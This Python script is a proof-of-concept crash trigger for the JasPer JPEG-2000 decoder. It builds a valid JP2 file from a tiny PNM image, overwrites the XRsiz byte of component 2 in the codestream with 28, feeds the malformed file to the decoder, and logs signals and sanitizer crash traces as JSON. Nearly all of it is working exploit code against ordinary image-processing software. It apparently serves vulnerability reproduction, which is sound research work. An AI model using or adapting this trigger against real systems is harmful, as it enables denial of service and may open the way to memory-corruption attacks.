#!/usr/bin/env python3
"""Generate and run a deterministic JasPer decoder trigger."""

import argparse
import json
import os
import signal
import subprocess
import sys
import tempfile
import time
from pathlib import Path

OUTPUT_LIMIT = 8192


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out")
    parser.add_argument("--timeout", type=float, default=15.0)
    return parser.parse_args()


def decode_output(data):
    return data.decode("utf-8", errors="replace")[:OUTPUT_LIMIT]


def signal_name(returncode):
    if returncode >= 0:
        return None
    try:
        return signal.Signals(-returncode).name
    except ValueError:
        return "SIG{}".format(-returncode)


def run_process(command, timeout):
    process = subprocess.Popen(
        command,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    start_time = time.monotonic()
    try:
        stdout, stderr = process.communicate(timeout=timeout)
        timed_out = False
    except subprocess.TimeoutExpired:
        process.kill()
        stdout, stderr = process.communicate()
        timed_out = True
    runtime_ms = int((time.monotonic() - start_time) * 1000)
    returncode = process.returncode if process.returncode is not None else -1
    return returncode, stdout or b"", stderr or b"", timed_out, runtime_ms


def make_source_image(path):
    pixels = bytearray()
    for y in range(2):
        for x in range(2):
            pixels.extend((x * 255, y * 255, (x + y) * 127))
    path.write_bytes(b"P6\n2 2 255\n" + pixels)


def normalized_evidence(returncode, stdout, stderr, timed_out, timeout):
    if timed_out:
        return {
            "kind": "custom",
            "value": "timeout after {} seconds".format(timeout),
            "path": None,
        }

    combined = (stdout + ("\n" if stdout and stderr else "") + stderr).strip()
    crash_markers = ("AddressSanitizer", "UndefinedBehaviorSanitizer")
    if returncode < 0 or any(marker in stderr for marker in crash_markers):
        lines = [line.strip() for line in stderr.splitlines() if line.strip()]
        excerpt = " | ".join(lines[:6])[:OUTPUT_LIMIT]
        if returncode < 0:
            excerpt = "{}: {}".format(signal_name(returncode), excerpt)
        return {
            "kind": "crash_trace",
            "value": excerpt,
            "path": None,
        }

    return {
        "kind": "combined_output",
        "value": combined[:OUTPUT_LIMIT],
        "path": None,
    }


def main():
    args = parse_args()
    command = [
        args.binary,
        "--input",
        "",
        "--output",
        "",
        "--output-format",
        "pnm",
    ]
    result = {
        "binary": args.binary,
        "command": command,
        "returncode": 127,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "custom", "value": "", "path": None},
        "error": None,
    }

    try:
        if args.timeout <= 0:
            raise ValueError("--timeout must be positive")

        with tempfile.TemporaryDirectory(prefix="jasper-poc-") as temp_dir_name:
            temp_dir = Path(temp_dir_name)
            source_image = temp_dir / "source.pnm"
            valid_jp2 = temp_dir / "valid.jp2"
            trigger_image = temp_dir / "trigger.jp2"
            output_image = temp_dir / "output.pnm"

            make_source_image(source_image)
            prepare_command = [
                args.binary,
                "--input",
                os.fspath(source_image),
                "--output",
                os.fspath(valid_jp2),
                "--output-format",
                "jp2",
            ]
            prepare_returncode, _, prepare_stderr, prepare_timed_out, _ = run_process(
                prepare_command, args.timeout
            )
            result["timed_out"] = prepare_timed_out
            if prepare_timed_out:
                raise RuntimeError("timeout while constructing valid JP2 seed")
            if prepare_returncode != 0:
                message = prepare_stderr.decode("utf-8", errors="replace").strip()
                raise RuntimeError("unable to construct valid JP2 seed: {}".format(message))

            payload = bytearray(valid_jp2.read_bytes())
            codestream_offset = payload.find(b"\xff\x4f\xff\x51")
            component_2_xrsiz_offset = codestream_offset + 0x31
            if codestream_offset < 0 or component_2_xrsiz_offset >= len(payload):
                raise RuntimeError("unexpected JP2 codestream generated by target")

            payload[component_2_xrsiz_offset] = 28
            trigger_image.write_bytes(payload)

            command[2] = os.fspath(trigger_image)
            command[4] = os.fspath(output_image)
            (
                result["returncode"],
                stdout,
                stderr,
                result["timed_out"],
                result["runtime_ms"],
            ) = run_process(command, args.timeout)
            result["stdout"] = decode_output(stdout)
            result["stderr"] = decode_output(stderr)
            result["signal"] = signal_name(result["returncode"])
            result["observable"] = normalized_evidence(
                result["returncode"],
                result["stdout"],
                result["stderr"],
                result["timed_out"],
                args.timeout,
            )
    except Exception as exc:
        result["error"] = str(exc)
        if not result["observable"]["value"]:
            result["observable"] = {
                "kind": "custom",
                "value": result["error"],
                "path": None,
            }

    json_text = json.dumps(result, indent=2, sort_keys=True)
    if args.json_out:
        output_path = Path(args.json_out)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text(json_text + "\n", encoding="utf-8")
    else:
        print(json_text)

    return 0 if result["error"] is None else 1


if __name__ == "__main__":
    sys.exit(main())
